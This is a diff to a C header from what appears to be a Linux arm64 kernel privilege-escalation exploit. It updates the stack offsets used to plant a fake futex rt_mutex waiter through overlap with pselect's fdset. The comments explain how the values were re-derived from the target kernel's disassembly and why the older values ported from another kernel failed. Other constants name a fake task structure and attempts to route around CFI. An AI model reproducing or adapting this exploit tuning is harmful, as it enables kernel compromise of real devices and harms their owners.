@@ -28,7 +28,20 @@
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffeffe00000ULL
 
-#define PSELECT_WAITER_WORD_SHIFT 0
+/* Statically re-derived from THIS kernel's disassembly (2026-10-24,
+ * bootdump.img, capstone/llvm-objdump -- the header above is right: the
+ * original run had no BTF and inherited rodin's value 0, never proven here):
+ *   pselect word0 = -(0x10 __arm64_sys_pselect6 + 0x90 __do_sys_pselect6
+ *                     + 0x1c0 core_sys_select) + 0x50 (bits base) = -0x210
+ *   futex waiter  = -(0x70 __arm64_sys_futex) - 0x128 (waiter depth in
+ *                     do_futex: x29=entry-0x60, waiter=x29-0xc8, double
+ *                     anchored on rt_mutex_init_waiter x0 and
+ *                     rt_mutex_wait_proxy_lock x2) = -0x198
+ *   delta = 0x78 -> waiter.tree at global word 15 -> shifted layout word
+ *   base 2 (tree at shift+2) -> shift 13.  Rodin's 0 meant its waiter.tree
+ *   sat exactly at fdset word0; here that guess put the fake waiter 15
+ *   qwords off, which is the PI-chain self-spin/x8=garbage family. */
+#define PSELECT_WAITER_WORD_SHIFT 13
 #define MM_STRUCT_SZ 0x3c0
 #define KSNITCH_COLLISIONS 6
 #define PSELECT_CFI_ROUTE_ATTEMPTS 12
@@ -142,7 +155,8 @@
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
 
-#define WAITER_LOCAL_OFF 0x90
+/* waiter depth below do_futex's entry sp (x29 - 0xc8 with x29 = entry - 0x60); re-derived 2026-10-24, was rodin's 0x90 */
+#define WAITER_LOCAL_OFF 0x128
 #define WAITER_TREE_ENTRY_OFF 0x0
 #define WAITER_PI_TREE_ENTRY_OFF 0x18
 #define WAITER_TASK_OFF 0x30
